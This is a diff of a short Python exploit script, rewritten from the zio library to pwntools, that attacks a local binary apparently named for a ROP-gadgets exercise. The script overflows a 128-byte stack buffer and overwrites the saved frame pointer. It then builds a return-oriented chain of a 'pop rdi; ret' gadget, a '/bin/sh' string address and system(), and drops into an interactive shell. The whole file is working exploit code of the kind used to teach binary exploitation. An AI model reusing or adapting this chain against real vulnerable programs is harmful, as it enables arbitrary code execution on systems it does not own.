@@ -1,19 +1,22 @@
 #!/usr/bin/python
 
-import struct
+from pwn import *
 
-from zio import *
+context(arch='x86', os='linux', endian='little', word_size=64)
 
-# 0x7ffff7a5b640 system
-# 0x7ffff7b91cdb /bin/sh
-# 0x00000000004005d3 pop rdi; ret
+p = process('./04-gadgets')
 
-payload = 'a' * 128                          # buffer
-payload += 'b' * 8                           # old rbp
-payload += struct.pack('<Q', 0x4005d3)       # "pop rdi; ret" addr
-payload += struct.pack('<Q', 0x7ffff7b91cdb) # "/bin/sh" addr
-payload += struct.pack('<Q', 0x7ffff7a5b640) # system addr
+system = 0x7ffff7a5b640
+binsh = 0x7ffff7b91cdb
+pop_rdi = 0x00000000004005d3
 
-io = zio("./04-gadgets")
-io.write(payload)
-io.interact()
+payload = ''
+payload += 'a' * 128                  # buffer
+payload += 'b' * 8                    # old rbp
+payload += struct.pack('<Q', pop_rdi) # "pop rdi; ret" addr
+payload += struct.pack('<Q', binsh)   # "/bin/sh" addr
+payload += struct.pack('<Q', system)  # system addr
+
+p.send(payload)
+
+p.interactive()
